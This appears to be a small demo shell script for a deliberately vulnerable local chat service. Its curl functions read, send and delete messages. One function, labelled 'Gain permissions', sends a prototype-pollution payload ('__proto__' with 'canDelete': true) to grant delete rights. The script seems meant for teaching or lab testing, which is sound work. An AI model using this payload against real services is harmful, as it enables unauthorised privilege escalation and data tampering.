# Working via curl

if [ -z "$VULNPKG_HOST" ]; then
    export VULNPKG_HOST=http://localhost:3001
fi

# Read messages
c1()
{
    curl --request GET --url "$VULNPKG_HOST/chat"
}

# Send message
c2()
{
    curl --request PUT \
      --url "$VULNPKG_HOST/chat" \
      --header 'content-type: application/json' \
      --data '{"auth": {"name": "user", "password": "pwd"}, "message": {"text": "Hi!"}}'
}

# Gain permissions
c3()
{
    curl --request PUT \
      --url "$VULNPKG_HOST/chat" \
      --header 'content-type: application/json' \
      --data '{"auth": {"name": "user", "password": "pwd"}, "message": { "text": "ðŸ˜ˆ", "__proto__": {"canDelete": true}}}'
}

# Delete message
c4()
{
    curl --request DELETE \
      --url "$VULNPKG_HOST/chat" \
      --header 'content-type: application/json' \
      --data '{"auth": {"name": "user", "password": "pwd"}, "messageId": 1}'
}
